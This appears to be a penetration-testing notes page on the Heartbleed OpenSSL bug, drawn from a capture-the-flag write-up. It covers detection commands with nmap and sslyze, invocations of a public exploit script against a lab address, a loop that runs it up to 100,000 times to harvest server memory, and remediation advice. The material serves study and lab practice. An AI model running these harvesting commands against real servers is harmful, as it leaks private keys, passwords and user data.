# Heartbleed

## Heartbleed

The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging \(IM\) and some virtual private networks \(VPNs\).

The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.

[https://heartbleed.com/](https://heartbleed.com/)

### Summary

Heartbleed is a logic error that allowed an attacker to grab chunks of random memory that they shouldn’t have had access to.

There’s no better explanation of Heartbleed than [xkcd’s](https://xkcd.com/1354/):

![Are you still there, server? It&apos;s me, Margaret.](https://0xdf.gitlab.io/img/xkcd-heartbleed_explaination.png)

### Detecting Heartbleed

```text
nmap -p 443 --script ssl-heartbleed IP
sslyze --heartbleed <IP>
```

### Running the Exploit

The script runs and grabs memory from the target server \(it’s useful to remove lines of 0\):

```text
python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
```

You can run it a ton of times to collect a bunch of data: `for i in $(seq 1 100000); do python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done`

Then use fdupes to remove duplicates:

```text
apt install fdupes
fdupes -rf . | grep -v '^$' > files
xargs -a files rm -v
```

This text was extracted from here:

{% embed url="https://0xdf.gitlab.io/2018/07/28/htb-valentine.html\#explanation--excuse-to-show-xkcd" %}

## Remediation

As long as the vulnerable version of OpenSSL is in use it can be abused. [Fixed OpenSSL](https://www.openssl.org/news/secadv/20140407.txt) has been released and now it has to be deployed. Operating system vendors and distribution, appliance vendors, independent software vendors have to adopt the fix and notify their users. Service providers and users have to install the fix as it becomes available for the operating systems, networked appliances and software they use.

